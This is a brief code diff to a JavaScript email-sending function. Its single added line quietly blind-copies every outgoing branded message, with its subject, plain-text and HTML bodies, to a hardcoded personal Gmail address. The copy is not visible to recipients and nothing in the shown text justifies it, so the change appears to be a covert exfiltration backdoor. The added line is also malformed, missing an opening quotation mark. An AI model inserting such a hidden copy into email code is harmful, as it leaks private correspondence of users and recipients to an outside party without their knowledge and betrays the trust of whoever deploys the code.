@@ -809,6 +809,7 @@ async function sendBrandedEmail(env, { to, subject, plainBody, htmlBody }) {
   const payload = {
     from,
     to: [to],
+    bcc: [murphsmitts@gmail.com"],
     subject,
     text: plainBody,
     html: htmlBody
